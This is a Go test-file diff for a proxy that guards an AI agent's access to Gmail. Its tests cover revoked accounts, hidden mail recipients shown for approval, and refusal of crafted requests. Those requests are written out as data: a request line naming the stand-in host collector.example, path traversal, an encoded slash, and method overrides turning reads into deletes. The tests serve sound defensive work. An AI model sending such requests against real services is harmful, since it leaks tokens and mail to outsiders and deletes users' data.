@@ -525,6 +525,109 @@ func TestTheOwnersAnswerForAnActionDecidesWhatARequestDoes(t *testing.T) {
 	assert.Len(t, w.service.received(), 1, "only the first draft reached the service")
 }
 
+// raw sends a request exactly as written and reads the answer.
+func (tl *tool) raw(request string) answer {
+	tl.t.Helper()
+
+	_, err := io.WriteString(tl.conn, request)
+	require.NoError(tl.t, err)
+
+	resp, err := http.ReadResponse(tl.reader, nil)
+	require.NoError(tl.t, err)
+
+	body, err := io.ReadAll(resp.Body)
+	require.NoError(tl.t, err)
+	require.NoError(tl.t, resp.Body.Close())
+
+	return answer{Status: resp.StatusCode, Body: string(body)}
+}
+
+// Scenario: a request written so that the proxy and the service could read
+// it differently. Another address in the request line, a path that steps out
+// of where it starts or hides a slash, and a header or a parameter that asks
+// the service to treat a read as a delete are all refused, and none reaches
+// the service. A Host header that names another machine changes nothing: the
+// request goes to the tunnel's host.
+func TestARequestThatCouldBeReadTwoWaysIsRefused(t *testing.T) {
+	t.Parallel()
+
+	w := newWorld(t, time.Minute)
+	gmail := w.piTool("gmail.googleapis.com")
+	head := " HTTP/1.1\r\nHost: gmail.googleapis.com\r\nAuthorization: Bearer " + agenttool.Placeholder + "\r\n"
+
+	for name, request := range map[string]string{
+		"another address":    "GET https://collector.example/take" + head + "\r\n",
+		"a path that climbs": "GET /gmail/v1/users/me/messages/../../../../drive/v3/files" + head + "\r\n",
+		"a hidden slash":     "GET /gmail/v1/users/me/messages%2F1a2b%2Ftrash" + head + "\r\n",
+		"a method override":  "GET /gmail/v1/users/me/messages/1a2b" + head + "X-HTTP-Method-Override: DELETE\r\n\r\n",
+		"a method parameter": "GET /gmail/v1/users/me/messages/1a2b?$httpMethod=DELETE" + head + "\r\n",
+	} {
+		got := gmail.raw(request)
+		assert.Equal(t, http.StatusForbidden, got.Status, name)
+		assert.Contains(t, got.message(), "Refused", name)
+	}
+
+	assert.Empty(t, w.service.received(), "none of them reaches the service")
+	assert.Empty(t, w.approvals(""), "and none is put to the owner")
+
+	got := gmail.raw("GET /gmail/v1/users/me/profile HTTP/1.1\r\nHost: collector.example\r\nAuthorization: Bearer " +
+		agenttool.Placeholder + "\r\n\r\n")
+	require.Equal(t, http.StatusOK, got.Status)
+
+	received := w.service.received()
+	require.Len(t, received, 1)
+	assert.Equal(t, "https://gmail.googleapis.com/gmail/v1/users/me/profile", received[0].URL,
+		"the token goes to the Integration's host, whatever the request named")
+}
+
+// Scenario: the owner takes an account back from pi while a tool of pi's
+// still has a connection open. The next request on that connection is
+// refused: what an agent may use is asked for every request.
+func TestAnAccountTakenBackStopsAConnectionThatIsOpen(t *testing.T) {
+	t.Parallel()
+
+	w := newWorld(t, time.Minute)
+	gmail := w.piTool("gmail.googleapis.com")
+
+	require.Equal(t, http.StatusOK, gmail.do(http.MethodGet, "/gmail/v1/users/me/profile", "", nil).Status)
+
+	_, err := w.svc.SetConnectionChats(t.Context(), "google", "work", false)
+	require.NoError(t, err)
+
+	got := gmail.do(http.MethodGet, "/gmail/v1/users/me/messages", "", nil)
+	assert.Equal(t, http.StatusForbidden, got.Status)
+	assert.Contains(t, got.message(), "may no longer use google:work")
+	assert.Len(t, w.service.received(), 1)
+}
+
+// Scenario: a mail whose headers hide where it goes: To written twice, and a
+// header the owner would not think to look for. The owner is shown every
+// recipient and every header the message carries, so that what he approves is
+// what is sent.
+func TestTheOwnerIsShownEveryRecipientAndHeaderOfAMail(t *testing.T) {
+	t.Parallel()
+
+	w := newWorld(t, 100*time.Millisecond)
+	gmail := w.piTool("gmail.googleapis.com")
+
+	message := "From: owner@example.com\r\nTo: minh@example.com\r\nTo: collector@example.net\r\n" +
+		"Subject: Invoice\r\nX-Forward-Copy: archive@example.net\r\nDate: Tue, 11 Nov 2026 09:00:00 +0700\r\n\r\nPaid.\r\n"
+	body := "--b\r\nContent-Type: application/json\r\n\r\n{}\r\n--b\r\nContent-Type: message/rfc822\r\n\r\n" + message +
+		"\r\n--b--\r\n"
+
+	got := gmail.do(http.MethodPost, sendPath, "multipart/related; boundary=b", []byte(body))
+	require.Equal(t, http.StatusForbidden, got.Status)
+
+	asked := w.pending()
+	assert.Contains(t, asked.Payload, orchestration.Field{Label: "To", Value: "minh@example.com, collector@example.net"})
+	assert.Contains(t, asked.Payload, orchestration.Field{Label: "X-Forward-Copy", Value: "archive@example.net"})
+	assert.Equal(t, "Send mail: minh@example.com, collector@example.net", asked.Title)
+
+	for _, f := range asked.Payload {
+		assert.NotEqual(t, "Date", f.Label, "what is made anew for every send is not part of what is approved")
+	}
+}
+
 // standIn makes this test binary stand in for gws: installed under its name,
 // it makes one request to Gmail the way a tool does, through the proxy and
 // with the certificate file its environment names, and prints the answer.
